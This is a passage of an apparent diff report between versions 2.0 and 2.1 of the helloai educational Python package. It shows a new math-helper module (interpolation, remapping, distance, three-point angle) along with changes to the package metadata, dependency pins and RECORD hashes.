+from math import asin, acos, atan, atan2
+
+import numpy as np
+
+__all__ = [
+    # TRIG FUNCTIONS
+    'sin', 'cos', 'tan', 'degrees', 'radians',
+
+    # INVERSE TRIG FUNCTIONS
+    'asin', 'acos', 'atan', 'atan2',
+
+    # TRIG CONSTANTS
+    'TWO_PI', 'PI', 'HALF_PI', 'QUARTER_PI', 'TAU', 'HALF_TAU',
+
+    # MATH FUNCTIONS FROM THE STANDARD LIBRARY (abs and round are
+    # available in builtins.)
+    'ceil', 'floor', 'exp', 'log', 'sqrt',
+
+    # MATH FUNCTIONS DEFINED HERE
+
+    'constrain', 'lerp', 'remap', 'normalize', 'distance', 'dist',
+    'magnitude', 'mag', 'sq', 'fract',
+
+    # ANGLE
+    'angle3p',
+]
+
+TWO_PI = 2 * math.pi
+PI = math.pi
+HALF_PI = math.pi / 2.0
+QUARTER_PI = math.pi / 4.0
+
+TAU = 2 * math.pi
+HALF_TAU = math.pi
+
+# We will be using these a lot, just precompute a whole lot of sin and
+# cosine values.
+SINCOS_PRECISION = 0.5
+SINCOS_LENGTH = int(360 / SINCOS_PRECISION)
+
+PRE_SIN = [sin(radians(d) * SINCOS_PRECISION) for d in range(SINCOS_LENGTH)]
+PRE_COS = [cos(radians(d) * SINCOS_PRECISION) for d in range(SINCOS_LENGTH)]
+
+SINCOS = list(zip(PRE_SIN, PRE_COS))
+
+
+def _sanitize(point, target_dimension=3):
+    return list(point) + [0] * (target_dimension - len(point))
+
+
+def _is_numeric(val):
+    return isinstance(val, int) or isinstance(val, float)
+
+
+def constrain(amount, low, high):
+    """Constrain the given value in the specified range.
+
+    Examples ::
+
+        >>> constrain(8, 1, 5)
+        5
+
+        >>> constrain(5, 1, 5)
+        5
+
+        >>> constrain(3, 1, 5)
+        3
+
+        >>> constrain(1, 1, 5)
+        1
+
+        >>> constrain(-3, 1, 5)
+        1
+
+    :param amount: The the value to be contrained.
+
+    :param low: The lower constain.
+
+    :param high: The upper constain.
+
+    """
+    if amount < low:
+        return low
+    elif amount > high:
+        return high
+    else:
+        return amount
+
+
+def lerp(start, stop, amount):
+    """Linearly interpolate the start value to the stop value.
+
+    Examples ::
+
+        >>> lerp(0, 10, 0.0)
+        0.0
+
+        >>> lerp(0, 10, 0.5)
+        5.0
+
+        >>> lerp(0, 10, 0.8)
+        8.0
+
+        >>> lerp(0, 10, 1.0)
+        10.0
+
+    :param start: The start value
+
+    :param stop: The stop value
+
+    :param amount: The amount by which to interpolate. (:math:`0 \leq
+        amount \leq 1`).
+    :type amount: float
+
+    """
+    return start + amount * (stop - start)
+
+
+def remap(value, source_range, target_range):
+    """Remap a value from the source range to the target range.
+
+    Examples ::
+
+         >>> remap(50, (0, 100), (0, 10))
+         5.0
+
+         >>> remap(5, (0, 10), (0, 100))
+         50.0
+
+         >>> remap(5, (0, 10), (10, 20))
+         15.0
+
+         >>> remap(15, (10, 20), (0, 10))
+         5.0
+
+    :param value: The value to be remapped.
+
+    :param source_range: The source range for :code:`value`
+    :type source_range: tuple
+
+    :param target_range: The target range for :code:`value`
+    :type target_range: tuple
+
+    """
+    s0, s1 = source_range
+    t0, t1 = target_range
+    S = s1 - s0
+    T = t1 - t0
+    return t0 + ((value - s0) / S) * T
+
+
+def normalize(value, low, high):
+    """Normalize the given value to the specified range.
+
+    Examples ::
+
+        >>> normalize(10, 0, 100)
+        0.1
+
+        >>> normalize(0.3, 0, 1)
+        0.3
+
+        >>> normalize(100, 0, 100)
+        1.0
+
+        >>> normalize(1, 1, 15)
+        0.0
+
+    :param value:
+    :type value: float
+
+    :param low: The lower bound for the range.
+    :type low: float
+
+    :param high: The upper bound for the range.
+    :type high: float
+    """
+    return remap(value, (low, high), (0, 1))
+
+
+def magnitude(x, y, z=0):
+    """Return the magnitude of the given vector.
+
+    Examples ::
+
+        >>> magnitude(3, 4)
+        5.0
+
+        >>> magnitude(2, 3, 6)
+        7.0
+
+        >>> magnitude(0, 0, 0)
+        0.0
+
+    :param x: The x-component of the vector.
+    :type x: float
+
+    :param y: The y-component of the vector.
+    :type y: float
+
+    :param z: The z-component of the vector (defaults to 0).
+    :type z: float
+
+    :returns: The magnitude of the vector.
+    :rtype: float
+
+    """
+    return np.sqrt(np.sum(np.array([x, y, z]) ** 2))
+
+
+def distance(point_1, point_2):
+    """Return the distance between two points.
+
+    Examples ::
+
+        >>> distance((0, 0, 0), (2, 3, 6))
+        7.0
+
+        >>> distance((2, 3, 6), (2, 3, 6))
+        0.0
+
+        >>> distance((6, 6, 6), (2, 3, 6))
+        5.0
+
+    :param point_1:
+    :type point_1: tuple
+
+    :param point_2:
+    :type point_2: tuple
+
+    :returns: The distance between two points
+    :rtype: float
+
+    """
+    p1 = np.array(_sanitize(point_1))
+    p2 = np.array(_sanitize(point_2))
+    return np.sqrt(np.sum((p1 - p2) ** 2))
+
+
+def sq(number):
+    """Square a number.
+
+    Examples ::
+
+        >>> square(-25)
+        625
+
+        >>> square(0)
+        0
+
+        >>> square(13)
+        169
+
+
+    :param number: The number to be squared.
+    :type number: float
+
+    :returns: The square of the number.
+    :rtype: float
+
+    """
+    return number ** 2
+
+
+def fract(number):
+    """Calculates the fractional part of a number.
+
+    Examples ::
+
+        >>> fract(7345.73472742)
+        0.73472742
+
+        >>> fract(1.4215e-15)
+        1.4215e-15
+
+    :param number: Number whose fractional part needs to be found out.
+    :type number: float
+
+    :returns: Fractional part of the number.
+    :rtype: float
+
+    """
+    return modf(number)[0]
+
+
+def angle3p(p1, p2, p3):
+    """3점 사이의 각도 계산 
+
+    Args:
+        p1 : (x1, y1)
+        p2 : (x2, y2)
+        p3 : (x3, y3)
+
+    Returns:
+        시계 반대방향의 각도       
+    """
+    Ax, Ay = p1[0]-p2[0], p1[1]-p2[1]
+    Cx, Cy = p3[0]-p2[0], p3[1]-p2[1]
+    a = math.atan2(Ay, Ax)
+    c = math.atan2(Cy, Cx)
+    if a < 0:
+        a += math.pi*2
+    if c < 0:
+        c += math.pi*2
+
+    rad = (math.pi*2 + c - a) if a > c else (c - a)
+    return rad * 180/math.pi
+
+
+# Helpful aliases
+dist = distance
+mag = magnitude
```

### encoding

```diff
@@ -1 +1 @@
-us-ascii
+utf-8
```

## Comparing `helloai-2.0.dist-info/LICENSE` & `helloai-2.1.dist-info/LICENSE`

 * *Files identical despite different names*

## Comparing `helloai-2.0.dist-info/METADATA` & `helloai-2.1.dist-info/METADATA`

 * *Files 22% similar despite different names*

```diff
@@ -1,38 +1,39 @@
-Metadata-Version: 2.1
-Name: helloai
-Version: 2.0
-Summary: A Python Library For AI Education
-Home-page: http://www.moyalab.com
-Author: devdio
-Author-email: iammoyalab@gmail.com
-License: GNU GPLv3
-Download-URL: https://www.moyalab.com
-Keywords: Kamibot,AI,Robot,CV
-Platform: UNKNOWN
-Classifier: Intended Audience :: Education
-Classifier: Operating System :: Microsoft :: Windows
-Classifier: Programming Language :: Python :: 3.8
-Classifier: Topic :: Education
-Requires-Python: >=3.8
-Description-Content-Type: text/markdown
-License-File: LICENSE
-Requires-Dist: opencv-contrib-python (==4.1.2.30)
-Requires-Dist: numpy (==1.19.5)
-Requires-Dist: vnoise (==0.1.0)
-Requires-Dist: Random-Word (==1.0.7)
-Requires-Dist: matplotlib (==3.2.2)
-Requires-Dist: keyboard (==0.13.5)
-Requires-Dist: Pillow (==8.3.2)
-Requires-Dist: tqdm (==4.41.1)
-Requires-Dist: imutils (==0.5.4)
-Requires-Dist: PyYAML (==6.0)
-Requires-Dist: pandas (==1.3)
-Requires-Dist: scikit-learn (==1.0)
-
-## A Python Library For AI Education
----
-Under development and use it under your own responsibility.
-
-
-
-
+Metadata-Version: 2.1
+Name: helloai
+Version: 2.1
+Summary: A Python Library For AI Education
+Home-page: http://www.moyalab.com
+Download-URL: https://www.moyalab.com
+Author: devdio
+Author-email: iammoyalab@gmail.com
+License: GNU GPLv3
+Keywords: Kamibot,AI,Robot,CV
+Classifier: Intended Audience :: Education
+Classifier: Operating System :: Microsoft :: Windows
+Classifier: Programming Language :: Python :: 3.8
+Classifier: Topic :: Education
+Requires-Python: >=3.10
+Description-Content-Type: text/markdown
+License-File: LICENSE
+Requires-Dist: opencv-contrib-python
+Requires-Dist: numpy (==1.25.1)
+Requires-Dist: vnoise (==0.1.0)
+Requires-Dist: Random-Word (==1.0.11)
+Requires-Dist: matplotlib (==3.7.2)
+Requires-Dist: pandas (==2.0.3)
+Requires-Dist: scikit-learn (==1.3.0)
+Requires-Dist: scipy (==1.11.1)
+Requires-Dist: mediapipe (==0.8.11)
+Requires-Dist: tensorflow (==2.10.1)
+Requires-Dist: tensorflow-datasets (==4.9.0)
+Requires-Dist: keyboard (==0.13.5)
+Requires-Dist: Pillow (==8.3.2)
+Requires-Dist: tqdm (==4.41.1)
+Requires-Dist: imutils (==0.5.4)
+Requires-Dist: PyYAML (==6.0)
+
+## A Python Library For AI Education
+---
+Under development and use it under your own responsibility.
+
+
```

## Comparing `helloai-2.0.dist-info/RECORD` & `helloai-2.1.dist-info/RECORD`

 * *Files 21% similar despite different names*

```diff
@@ -1,44 +1,52 @@
-hi.py,sha256=UQuxVrWsNSM64OUOKoZ8UxCdc6LoxJgXkfHyno3fi4M,1214
+hi.py,sha256=Ri5rYCISFQ77zH3QvMLMgvR35V2-tcarOQMxjObHV0k,559
 helloai/__init__.py,sha256=V4pQyGWp6B05BkQOP1ZSxB4Yi04utfTmnc8uJ2p5S_g,84
 helloai/__main__.py,sha256=9xbdgcFm03y78mteoMLcB4SxzekL3Fh0DH4xO4ncLao,40
 helloai/builtins.py,sha256=V4pQyGWp6B05BkQOP1ZSxB4Yi04utfTmnc8uJ2p5S_g,84
-helloai/runner.py,sha256=atvbdWkUVcl1PnYgneonICZs-yQh-4FrCTp2rle0GfY,5378
+helloai/runner.py,sha256=dZBEmT2eCgGn2Ny1vER92M5U7Nwl3c3FfVy752Ferz8,3684
 helloai/version.py,sha256=_y2tWv5vxdbFuMG0axOdyMmpsnvew95hU5qJCBrxR1o,1144
 helloai/core/__init__.py,sha256=O94qHd3rN629Scp1_ThWvejostJOgpZCnLgluuz2Fo8,676
-helloai/core/api.py,sha256=63lTlVzgbTrzWFDazXI5ZRY-ebQpoSTuZH442O58AoA,9003
+helloai/core/api.py,sha256=ztRRRYE53ZVYTl0m2DbUpIVGbPeEpRIgW4E-kwwtJWA,6407
 helloai/core/camera.py,sha256=ROZ60Ggs7tPEv3DvvUMt1iXYFMJHXczwAxwKML1TOJU,5606
 helloai/core/colors.py,sha256=WGSRDnNqldRGB1J66XbCTD_7CSfsC25UC-EBq5AkqU4,16195
 helloai/core/config.py,sha256=4VsxyPKQfb0dPpy2y0ksd3y4GiV-vv53F9NcW3iaOro,1526
-helloai/core/core.py,sha256=2eDKWq9MYCOVtDEo08OqReQiighar3zqdpFNYl2aPXY,11850
+helloai/core/core.py,sha256=v1h_7fZ_varABaMja3sIYGCKZy-LoEknTvEDegy8wwk,8536
 helloai/core/display.py,sha256=3ZOW3gdh0VBXSgJij1w9_CUjxJyLc6QObz3t01Jtdjk,1812
 helloai/core/helper.py,sha256=1555YJrcCfqZ8iIGmwZ5EoZtxZLvZ1BMO-VgmC3uaBw,720
-helloai/core/image.py,sha256=vdbQonpThkH33t63FtW4Pz01fJbCMS6PLFNHZ_UuZhE,69939
+helloai/core/image.py,sha256=tu7dcRpHjmqSkf0qEn2OGnyDhd_ArqDSLwTjrqw7OdU,52108
 helloai/core/movie.py,sha256=uqT1hbyjUcyNF5COUwSi2wbHsQ-A5B89pX4rjRmmpus,2828
 helloai/core/mytimer.py,sha256=a-i9uQ6weJWpCvR9pwffFTV7z5IMzc-DMP_3M19fUW4,790
 helloai/core/plotwindow.py,sha256=CVn49VzrDdnN2q6hTjZJISXpr4gkzPSW4-q1BhNvyBM,2468
 helloai/core/singlestore.py,sha256=FaF_xXSKxCXGkYBSa0pH1RLM4PiHcL7EEqMRtGg_QoY,285
 helloai/core/sketch.py,sha256=47DEQpj8HBSa-_TImW-5JCeuQeRkm5NMpJWZG3hSuFU,0
 helloai/core/trackbarwin.py,sha256=xNOtAyib-2HBzbp4IdPn9qs5DGNapbj0WiHrh6-iyfg,489
 helloai/core/vector.py,sha256=SQyMRTfIgi-mkDu-9mRYiHNloFFui1AIaZ_yyK1qObY,13096
 helloai/core/video.py,sha256=-m3V7YTKoLU8caMGDizDD2P4jCmy2pX7NyKGO3VKeTs,2834
 helloai/core/video_writer.py,sha256=tlHc8Bqw6Xl3bFJN9HyiUrr-ajWgtyJpuLtvyPfyLYw,1800
-helloai/core/virtualcamera.py,sha256=nyAq_cGaZKHJj9Xuat4C89deS4BG_BWVweDSx9_g08A,4039
+helloai/core/virtualcamera.py,sha256=fpkAdqR16zbWjNCPSg0pUrkAKp2zHP8ixhicsy0vNqQ,2683
 helloai/core/window.py,sha256=FPO2yBZjCAx-iMAM29GMTcSCVHQ4KhtpaR8qVWLXQmM,8984
-helloai/ext/__init__.py,sha256=OVLMl1_EM-5h--h_ASATiD6QdA3wo6pN4Hbp290wzq4,140
+helloai/ext/__init__.py,sha256=RPbrBL3GrYm9-YpF6QVGoeQvTlC3yE9oDaYbwTcZhm8,132
 helloai/ext/aruco/__init__.py,sha256=pBJy3orfSNmJsuIM6Ed1CxklyITkpuFWYQ6NhA7vGkI,20
 helloai/ext/aruco/aruco.py,sha256=12KNHebQViHcgVDpW6TyZwu_q98TqscMlzwSf8domgo,4330
 helloai/ext/aruco/aruco_test.py,sha256=kvHFwHiT8L9_BFI185rqie68OECPoc4TyD-nT6ToSwo,3111
-helloai/utils/PID.py,sha256=2zMA-jnTVPewYU3FgYnpI01QYGDTSqkPZrx69j2khGA,3447
+helloai/ext/face_detector/__init__.py,sha256=BZkDzzAqcUUz85D0dCDxsBNn8n5cjGoY9Ia14iKtFPo,28
+helloai/ext/face_detector/face_detector.py,sha256=L-LO4JBa68v44xBFhD1ZANhcOIaWQf5JtSKsSgpzM5s,4379
+helloai/ext/hands_detector/__init__.py,sha256=ApigGpO0JJadr5JYPFda7jBAjWkpDZrhSLcvNq_Vekc,29
+helloai/ext/hands_detector/hands_detector.py,sha256=EBzvU1JF33XxQNsqH-jBUyC9DU3AsSPRT4MzLkc_nW4,5110
+helloai/ext/pose_detector/__init__.py,sha256=QguF5SXTtX5IPUqEpgZEGzfnlqOqFORAJwt_Jvw9Gs4,30
+helloai/ext/pose_detector/pose_detector.py,sha256=eeHQdrU1ghf79oYnikH7ZBLUh6f1ktckJbC1hoAqdyE,4053
+helloai/ext/tmimage/__init__.py,sha256=pgohsQKUp4Db8RKWvyNIw5PkEhl5eOoPzV5RnlGMi2Q,31
+helloai/ext/tmimage/tm_imageproject.py,sha256=ULo-psiy1TzM3MJiEpusoptWBLjCEQnAMuRV-Hg5pkQ,4986
+helloai/utils/PID.py,sha256=7oqO77_OK6cxZeuToS0OG9ijD5BaTuItviAULQ91N_A,2241
 helloai/utils/__init__.py,sha256=4C5yes7NsQi9Pe4sBJqBxp2rCSrcECkcglwwjehg3FI,112
-helloai/utils/cvzone.py,sha256=tER8lozN4ToBiU1Oaze0IKfI3-e2OMML1Qq30rlrFgk,9355
-helloai/utils/fetcher.py,sha256=9zPSagWWDTgOHttKhTvAaKeW6xewrmVNIEWxIfP-stg,4850
-helloai/utils/rand.py,sha256=mtAOAIVyGLo9ga2BdYwF7VquI1wmVwP7YhAN_dVxXpY,9679
-helloai/utils/time.py,sha256=NQHR9GnPeLTJ80V184l_E9Zarajl0eeV_tQ3q3uMv1s,364
-helloai/utils/utils.py,sha256=lr6NovPNN7ReKEORmJZZijhhqQDw4BPx64D7OfgpIYQ,9631
+helloai/utils/cvzone.py,sha256=UjKcFtbWJwY1gqpzCr-SpojGqwN1trFhGPW-FPjOkdo,6672
+helloai/utils/fetcher.py,sha256=aR-J-WXwKCrp8abA1dhR-7MoK3iu3pvY6Dv2K3-yOo0,3288
+helloai/utils/rand.py,sha256=uFgfu62MyU1b9Oi71UIa3ZxSrhjZ6fb1f-oD-59Y6s8,6915
+helloai/utils/time.py,sha256=xxCmMa4BLR97XZ8eEiut56MbspqSdhHlwakasTcwHvA,1090
+helloai/utils/utils.py,sha256=A93aoftOy_mntZlrA_3ODBFFKsCalWYs-bL_QSdtzeY,6878
 helloai/utils/voc.py,sha256=huResDWRG7JOlSazK_GND4u5p4-3U0F1CIoqwe-zS6M,2428
-helloai-2.0.dist-info/LICENSE,sha256=5PGNxtToA4KbNqWf6UDn1qHur4bv8yERYgebnSXaTbo,849
-helloai-2.0.dist-info/METADATA,sha256=hUe9o4lZp4g9zjQOxvkTSH--JB1SV4mk2mGNCIred4Y,1063
-helloai-2.0.dist-info/WHEEL,sha256=G16H4A3IeoQmnOrYV4ueZGKSjhipXx8zc8nu9FGlvMA,92
-helloai-2.0.dist-info/entry_points.txt,sha256=7fHwYmjh0uiTc7QQTEYLi_tmdikMyul1e8IH8jeztEc,45
-helloai-2.0.dist-info/top_level.txt,sha256=5yUPQL2AnwMAOXlF0Pr-nQv2i1TY3FSPUO1T6qowdRY,11
-helloai-2.0.dist-info/RECORD,,
+helloai-2.1.dist-info/LICENSE,sha256=5PGNxtToA4KbNqWf6UDn1qHur4bv8yERYgebnSXaTbo,849
+helloai-2.1.dist-info/METADATA,sha256=LMpWk3nvc1cRPvwH0_Q8j9YwQBR-sjvjG9loMeXuW_s,1225
+helloai-2.1.dist-info/WHEEL,sha256=pkctZYzUS4AYVn6dJ-7367OJZivF2e8RA9b_ZBjif18,92
+helloai-2.1.dist-info/entry_points.txt,sha256=uYhY3fMjzHmOb2xC2RHHhjUKx7e8qQxL_v9K-crGxco,44
+helloai-2.1.dist-info/top_level.txt,sha256=5yUPQL2AnwMAOXlF0Pr-nQv2i1TY3FSPUO1T6qowdRY,11
+helloai-2.1.dist-info/RECORD,,
```

